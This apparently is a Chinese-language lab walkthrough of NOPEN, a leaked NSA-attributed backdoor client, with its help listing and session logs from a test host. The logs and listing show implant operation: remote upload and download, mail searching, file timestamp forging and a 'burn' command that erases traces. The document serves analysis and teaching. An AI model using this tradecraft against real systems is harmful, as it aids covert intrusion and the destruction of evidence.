[file2 ...] 搜索文件内容
Usage: -oget [-a] [-q] [-s skipoff] [-b begoff] [-e endoff] remfile 带offset的下载
文件
Usage: -put locfile remfile [mode] 上传文件
Usage: -strings remfile 查看文件中的字符串
Usage: -tail [+/-n] remfile, + to skip n lines of remfile beginning 查看文件尾部内
容
Usage: -touch [-t mtime:atime | refremfile] remfile 修改文件时间信息
Usage: -rm remfile|remdir ... 删除文件
Usage: -upload file port [fromip] 上传文件的指定端口
Usage: -mailgrep [-l] [-m maxbytes] [-r "regexp" [-v]] [-f regexpfilename [-v]] 
[-a "regexp for attachments to eliminate"] [-b MM-DD-YYYY] [-e MM-DD-YYYY] [-d 
remotedumpfile] remotedir file1 [file2 ...] 邮件搜索
 ex: -mailgrep -a ".doc" -r "^Fred" -b 2-28-2002 /var/spool/mail G*
Remote Directory Commands:
Usage: -find [-d] [-M | -m -mkfindsargs] [-x[m|a|c] MM-DD-YYYY] remdir 
[remdir...] 查找文件
Usage: -ls [-1ihuRt] [-x[m|a|c] MM-DD-YYYY] [remfile|remdir ...] 显示目录
Usage: -cd [remdir] 跳转目录
Usage: -cdp 返回上次目录
Local Client Commands:
Usage: -autopilot port [xml] 自动执行命令
Usage: -cmdout [locfilename] 输出重定向到文件
Usage: -exit 退出
Usage: -help 帮助
Usage: -hist 命令历史记录
Usage: -keepalive [-d] [-r] [[-v] interval] 定时发送心跳
Usage: -readrc [locfile] 读取资源文件
Usage: -remark [comment] 注释
Usage: -rem [comment] 注释
Usage: # [comment] 注释
Usage: -reset 重置终端设置
Local Environment Commands:
Usage: -lcd locdir 本地目录跳转
Usage: -lgetenv 本地显示环境变量
Usage: -lpwd 本地当前目录
Usage: -lsetenv VAR=[val] 本地环境变量设置
Usage: -lsh [[-q] command] 本地shell命令执行
Aliases:
根据-help的帮助信息，工具的功能分为本地和远端两部分，然后再按照功能进行细分。
上面执行了-status命令，这个命令返回连接状态，包括两端软件信息，环境信息，也包含通信的流量和
连接信息。
NSA的命令行工具，基本都是这种格式。-xxx arg1 arg2 ...
通过统一的命令格式和帮助系统，降低了操作员的学习成本和负担，可以快速上手。
客户端支持历史命令操作，但是木有命令补全。
主要包括8个功能模块，每个模块支持多个命令操作，下面逐一看看这些命令。
本地环境变量
主要是设置环境变量，更改目录，执行本地shell命令等等。
NO! centos4x86.local:/root/bvp47>-status
[03-16-22 02:59:21 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-status]
Connection
  Bytes In / Out     1501/854 (175%C) / 1048/503 (208%C)
  Local Host:Port    localhost:39955 (127.0.0.1:39955)
  CRemote Host:Port  172.19.2.11:32754 (172.19.2.11:32754)
  Remote Host:Port   centos4x86.local:32754 (172.19.2.11:32754)
Local
  NOPEN client       3.3.2.3
  Date/Time          Wed Mar 16 02:59:21 UTC 2022
  History            
/home/hacker/test/../down/history/centos4x86.local.172.19.2.11
  Command Out        
/home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-2022-03-16-
02:01:16
  CWD                /home/hacker/test
  NHOME              /home/hacker/test/..
  PID (PPID)         28563 (15348)
Remote
  NOPEN server       3.3.0.1 (version mismatch, 3.3.0.1 != 3.3.2.3)
  WDIR               /root/bvp47
  OS                 Linux 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686
  CWD                /root/bvp47
  PID (PPID)         6139 (5107)
-lcd /tmp
[03-16-22 03:21:05 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-lcd /tmp]
/tmp
NO! centos4x86.local:/root/bvp47>-lpwd
[03-16-22 03:21:11 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-lpwd]
/tmp
NO! centos4x86.local:/root/bvp47>-lgetenv
[03-16-22 03:21:19 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-lgetenv]
[HOSTNAME=centos5x86.local]
[SHELL=/bin/bash]
[TERM=screen]
[HISTSIZE=1000]
[SSH_CLIENT=172.19.2.1 29472 22]
[SSH_TTY=/dev/pts/2]
[USER=hacker]
[LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;
01:or=01;05;37;41
:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=0
1;32:*.sh=01;32:*
.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;
31:*.z=01;31:*.Z=
01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jp
g=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:
]
[TERMCAP=SC|screen|VT 100/ANSI X3.64 virtual terminal:\
        :DO=\E[%dB:LE=\E[%dD:RI=\E[%dC:UP=\E[%dA:bs:bt=\E[Z:\
        :cd=\E[J:ce=\E[K:cl=\E[H\E[J:cm=\E[%i%d;%dH:ct=\E[3g:\
        :do=^J:nd=\E[C:pt:rc=\E8:rs=\Ec:sc=\E7:st=\EH:up=\EM:\
        :le=^H:bl=^G:cr=^M:it#8:ho=\E[H:nw=\EE:ta=^I:is=\E)0:\
        :li#25:co#97:am:xn:xv:LP:sr=\EM:al=\E[L:AL=\E[%dL:\
        :cs=\E[%i%d;%dr:dl=\E[M:DL=\E[%dM:dc=\E[P:DC=\E[%dP:\
        :im=\E[4h:ei=\E[4l:mi:IC=\E[%d@:ks=\E[?1h\E=:\
        :ke=\E[?1l\E>:vi=\E[?25l:ve=\E[34h\E[?25h:vs=\E[34l:\
        :ti=\E[?1049h:te=\E[?1049l:us=\E[4m:ue=\E[24m:so=\E[3m:\
        :se=\E[23m:mb=\E[5m:md=\E[1m:mr=\E[7m:me=\E[m:ms:\
        :Co#8:pa#64:AF=\E[3%dm:AB=\E[4%dm:op=\E[39;49m:AX:\
        :vb=\Eg:G0:as=\E(0:ae=\E(B:\
        :ac=\140\140aaffggjjkkllmmnnooppqqrrssttuuvvwwxxyyzz{{||}}~~..--
++,,hhII00:\
        :po=\E[5i:pf=\E[4i:Z0=\E[?3h:Z1=\E[?3l:k0=\E[10~:\
        :k1=\EOP:k2=\EOQ:k3=\EOR:k4=\EOS:k5=\E[15~:k6=\E[17~:\
        :k7=\E[18~:k8=\E[19~:k9=\E[20~:k;=\E[21~:F1=\E[23~:\
        :F2=\E[24~:F3=\EO2P:F4=\EO2Q:F5=\EO2R:F6=\EO2S:\
        :F7=\E[15;2~:F8=\E[17;2~:F9=\E[18;2~:FA=\E[19;2~:kb=:\
        :K2=\EOE:kB=\E[Z:kF=\E[1;2B:kR=\E[1;2A:*4=\E[3;2~:\
        :*7=\E[1;2F:#2=\E[1;2H:#3=\E[2;2~:#4=\E[1;2D:%c=\E[6;2~:\
        :%e=\E[5;2~:%i=\E[1;2C:kh=\E[1~:@1=\E[1~:kH=\E[4~:\
        :@7=\E[4~:kN=\E[6~:kP=\E[5~:kI=\E[2~:kD=\E[3~:ku=\EOA:\
        :kd=\EOB:kr=\EOC:kl=\EOD:km:]
[PATH=/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:/home/hacker/bin]
[MAIL=/var/spool/mail/hacker]
[STY=15347.pts-2.centos5x86]
[PWD=/home/hacker/test]
[INPUTRC=/etc/inputrc]
[LANG=en_US.UTF-8]
[SSH_ASKPASS=/usr/libexec/openssh/gnome-ssh-askpass]
[HOME=/home/hacker]
[SHLVL=2]
[LOGNAME=hacker]
[WINDOW=0]
[SSH_CONNECTION=172.19.2.1 29472 172.19.2.13 22]
[LESSOPEN=|/usr/bin/lesspipe.sh %s]
[DISPLAY=localhost:10.0]
[G_BROKEN_FILENAMES=1]
[_=./noclient-3.3.2.3-linux-i386]
[OLDPWD=/home/hacker]
[NOPEN_CLIENTVER=3.3.2.3]
[NOPEN_MYPID=28563]
[NHOME=/home/hacker/test/..]
通过上面的操作实例，可以看出，这些命令方便了客户端的基本操作，通过-lsh这个命令，可以执行本
地的shell命令，结合环境变量，可以实现在一个终端实现全部操作。
本地客户端命令
主要是本地自动操作，日志管理，心跳设置，操作序列文件管理，Terminal的重置。
[NOPEN_SERVERINFO=Linux 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686]
[NOPEN_RHOSTNAME=centos4x86.local.172.19.2.11]
[NOPEN_MYLOG=/home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-2022-
03-16-02:01:16]
[NOPEN_AUTOPORT=1025]
[LINES=24]
[COLUMNS=97]
NO! centos4x86.local:/root/bvp47>-lsh ps aux| grep noclient
[03-16-22 03:24:19 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-lsh ps aux| grep noclient]
hacker   26182  0.0  0.0   4592   996 pts/3    R+   23:24   0:00 sh -c ps aux| 
grep noclient
hacker   28563  0.0  0.1   5188  1532 pts/3    S+   22:01   0:00 ./noclient-
3.3.2.3-linux-i386 17
NO! centos4x86.local:/root/bvp47>-lsetenv TARGET=nsa.org
...
[TARGET=nsa.org]
NO! centos4x86.local:/root/bvp47>-lsh ls
[03-16-22 03:26:57 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-lsh ls]
gconfd-root
keyring-4F3uu9
keyring-BmyVpS
mapping-root
orbit-root
ssh-yBRWXJ2431
virtual-root.541NyD
NO! centos4x86.local:/root/bvp47>-lsh ping $TARGET
[03-16-22 03:27:40 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-lsh ping $TARGET]
ping: unknown host nsa.org
-cmdout test.cmd
[03-16-22 06:40:32 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-cmdout test.cmd]
Command out file: /home/hacker/test/../down/cmdout/test.cmd
NO! centos4x86.local:/root/bvp47>-ls
[03-16-22 06:41:00 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-ls]
drwxr-xr-x    3 root     root         4096 Mar 13 05:00 2022 .
drwxr-x---   11 root     root         4096 Mar 13 05:13 2022 ..
-rwxr-xr-x    1 root     root       126702 Feb 28 04:39 2022 ish.v3
NO! centos4x86.local:/root/bvp47>-cksum ish.v3
[03-16-22 06:41:42 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-cksum ish.v3]
Opening checksum file "/home/hacker/test/../etc/cksums"... 
/home/hacker/test/../etc/cksums: No such file or directory
NO! centos4x86.local:/root/bvp47>-exit
默认就会保存命令和响应
但是可以将保存到默认的输出文件中，如果指定输出文件，就保存到指定文件中，这时默认文件就不再
保存输入输出了。
keepalive
keepalive是控制心跳包的发送，主要是保持连接，避免超时。
[03-16-22 06:42:18 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-exit]
Connection
  Bytes In / Out     2957/3077 (96%C) / 1500/677 (221%C)
  Local Host:Port    localhost:39955 (127.0.0.1:39955)
  CRemote Host:Port  172.19.2.11:32754 (172.19.2.11:32754)
  Remote Host:Port   centos4x86.local:32754 (172.19.2.11:32754)
Local
  NOPEN client       3.3.2.3
  Date/Time          Wed Mar 16 06:42:18 UTC 2022
  History            
/home/hacker/test/../down/history/centos4x86.local.172.19.2.11
  Command Out        
/home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-2022-03-16-
02:01:16
  CWD                /tmp
  NHOME              /home/hacker/test/..
  PID (PPID)         28563 (15348)
Hasta
cat /home/hacker/test/../down/cmdout/test.cmd
ls
centos4x86.local.172.19.2.11-2022-03-16-02:01:16  test.cmd
tail -n1 centos4x86.local.172.19.2.11-2022-03-16-02\:01\:16
[-cmdout test.cmd]
>-keepalive -v 10
[03-16-22 06:58:44 GMT][localhost:56940 -> centos4x86.local.172.19.2.11:32754]
[-keepalive -v 10]
Keepalive enabled (probes sent every 10 seconds)
NO! centos4x86.local:/root/bvp47>-keepalive -r
[03-16-22 06:59:16 GMT][localhost:56940 -> centos4x86.local.172.19.2.11:32754]
[-keepalive -r]
Current keepalive interval: 10 seconds
[keepalive: server is alive, remote time: Sun Mar 13 10:23:29 2022]
NO! centos4x86.local:/root/bvp47>-keepalive -d
[03-16-22 06:59:22 GMT][localhost:56940 -> centos4x86.local.172.19.2.11:32754]
[-keepalive -d]
Keepalive disabled
autopilot
autopilot 设置自动执行命令的端口。
norc
系统会根据服务端的类型，读入响应的rc文件，文件里面包含的是只有两种格式一是alias，二是注释
#。
读入后，就可以使用这些命令了。
exit会让服务端退出。burn会清理痕迹，然后退出。
如果想退出客户端，但是不退出服务端，Ctrl+C两次即可。
远程目录命令
find
查找需要一个脚本mkfinds。
cd ls
-autopilot 2005
[03-16-22 07:02:57 GMT][localhost:56940 -> centos4x86.local.172.19.2.11:32754]
[-autopilot 2005]